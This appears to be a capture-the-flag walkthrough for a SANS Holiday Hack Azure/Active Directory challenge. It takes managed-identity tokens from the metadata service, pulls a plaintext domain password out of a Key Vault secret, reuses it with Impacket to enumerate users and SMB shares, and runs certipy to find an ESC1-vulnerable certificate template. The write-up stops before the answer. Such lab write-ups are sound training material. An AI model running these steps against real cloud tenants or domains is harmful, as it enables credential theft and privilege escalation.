## Objective
Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

## Solution

```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13"
TOKEN_MGT=`curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/" | jq -r '.access_token'`
```

#### Get Subscriptions

```bash
curl -X GET -H "Authorization: Bearer $TOKEN_MGT" -H "Content-Type: application/json" -H "Cache-Control: no-cache" \
  "https://management.azure.com/subscriptions?api-version=2022-01-01"
```
```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
      "authorizationSource": "RoleBased",
      "managedByTenants": [],
      "tags": {
        "sans:application_owner": "SANS:R&D",
        "finance:business_unit": "curriculum"
      },
      "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "displayName": "sans-hhc",
      "state": "Enabled",
      "subscriptionPolicies": {
        "locationPlacementId": "Public_2014-09-01",
        "quotaId": "EnterpriseAgreement_2014-09-01",
        "spendingLimit": "Off"
      }
    }
  ],
  "count": {
    "type": "Total",
    "value": 1
  }
}
```
#### Get Details about the Subscription
```bash
curl -X GET -H "Authorization: Bearer $TOKEN_MGT" -H "Content-Type: application/json" -H "Cache-Control: no-cache" \
  "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64?api-version=2022-01-01"
```
```json
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
  "authorizationSource": "Bypassed",
  "managedByTenants": [],
  "tags": {
    "sans:application_owner": "SANS:R&D",
    "finance:business_unit": "curriculum"
  },
  "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
  "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
  "displayName": "sans-hhc",
  "state": "Enabled",
  "subscriptionPolicies": {
    "locationPlacementId": "Public_2014-09-01",
    "quotaId": "EnterpriseAgreement_2014-09-01",
    "spendingLimit": "Off"
  }
}
```
#### List Resources within a Subscription
```bash
curl -X GET -H "Authorization: Bearer $TOKEN_MGT" -H "Content-Type: application/json" -H "Cache-Control: no-cache" \
  "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2022-01-01"
```
```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }
  ]
}
```
#### List all Resource Group
```bash
curl -X GET -H "Authorization: Bearer $TOKEN_MGT" -H "Content-Type: application/json" -H "Cache-Control: no-cache" \
  "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2022-01-01"
```
```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
      "name": "northpole-rg1",
      "type": "Microsoft.Resources/resourceGroups",
      "location": "eastus",
      "tags": {},
      "properties": {
        "provisioningState": "Succeeded"
      }
    }
  ]
}
```
### Accessing the Keys Vaults
```bash
TOKEN_VLT=`curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net" | jq -r '.access_token'`
```
```bash
curl -X GET -H "Authorization: Bearer $TOKEN_VLT" -H "Content-Type: application/json" \
  "https://northpole-it-kv.vault.azure.net/keys?api-version=7.2"
```
```json
{
  "error": {
    "code": "Forbidden",
    "message": "Caller is not authorized to perform action on resource.\r\nIf role assignments, deny assignments or role definitions were changed recently, please observe propagation time.\r\nCaller: appid=b84e06d3-aba1-4bcc-9626-2e0d76cba2ce;oid=600a3bc8-7e2c-44e5-8a27-18c3eb963060;iss=https://sts.windows.net/90a38eda-4006-4dd5-924c-6ca55cacc14d/\r\nAction: 'Microsoft.KeyVault/vaults/keys/read'\r\nResource: '/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/microsoft.keyvault/vaults/northpole-it-kv'\r\nAssignment: (not found)\r\nDenyAssignmentId: null\r\nDecisionReason: 'DeniedWithNoValidRBAC' \r\nVault: northpole-it-kv;location=eastus\r\n",
    "innererror": {
      "code": "ForbiddenByRbac"
    }
  }
}
```
#### Listing the Secrets in Vault
```bash
curl -X GET -H "Authorization: Bearer $TOKEN_VLT" -H "Content-Type: application/json" \
  "https://northpole-it-kv.vault.azure.net/secrets?api-version=7.2"
```
```json
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```
#### Accessing the secrets in the vault
```bash
curl -X GET -H "Authorization: Bearer $TOKEN_VLT" -H "Content-Type: application/json" \
"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.2"
```
```json
{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```
#### TmpScript
```Powershell
Import-Module ActiveDirectory;
$UserName = "elfy";
$UserDomain = "northpole.local";
$UserUPN = "$UserName@$UserDomain";
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force;
$DCIP = "10.0.0.53";
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```
### AD User Enumeration
```
alabaster@ssh-server-vm:~/impacket$ GetADUsers.py  northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53  -all
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2023-12-25 01:03:23.191767  2023-12-25 20:06:12.892916 
Guest                                                 <never>              <never>             
krbtgt                                                2023-12-25 01:11:07.280803  <never>             
elfy                                                  2023-12-25 01:13:30.792119  2023-12-25 19:01:53.713983 
wombleycube                                           2023-12-25 01:13:30.901503  2023-12-25 20:43:19.132455 
```
#### SMB Enumeration
```
alabaster@ssh-server-vm:~/impacket$ smbclient.py  northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 .
drw-rw-rw-          0  Mon Dec 25 01:14:22 2023 ..
-rw-rw-rw-     701028  Mon Dec 25 01:14:25 2023 Cookies.pdf
-rw-rw-rw-    1521650  Mon Dec 25 01:14:25 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Mon Dec 25 01:14:25 2023 SignatureCookies.pdf
drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 super_secret_research
-rw-rw-rw-        165  Mon Dec 25 01:14:25 2023 todo.txt
# mget *
[*] Downloading Cookies.pdf
[*] Downloading Cookies_Recipe.pdf
[*] Downloading SignatureCookies.pdf
[*] Downloading todo.txt
```

#### Exploiting Misconfigured AD Certificate Template-ESC1

```bash
certipy find -vulnerable -dc-ip 10.0.0.53 -u elfy@northpole.local -p 'J4`ufC49/J4766'
```
```txt
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20231225221757_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231225221757_Certipy.txt'
[*] Saved JSON output to '20231225221757_Certipy.json'
alabaster@ssh-server-vm:~/impacket$ cat 20231225221757_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : northpole-npdc01-CA
    DNS Name                            : npdc01.northpole.local
    Certificate Subject                 : CN=northpole-npdc01-CA, DC=northpole, DC=local
    Certificate Serial Number           : 25456FB64FCC00B54105D411B9CE0630
    Certificate Validity Start          : 2023-12-25 01:06:19+00:00
    Certificate Validity End            : 2028-12-25 01:16:18+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : NORTHPOLE.LOCAL\Administrators
      Access Rights
        ManageCertificates              : NORTHPOLE.LOCAL\Administrators
                                          NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        ManageCa                        : NORTHPOLE.LOCAL\Administrators
                                          NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Enroll                          : NORTHPOLE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : NorthPoleUsers
    Display Name                        : NorthPoleUsers
    Certificate Authorities             : northpole-npdc01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Domain Users
                                          NORTHPOLE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```
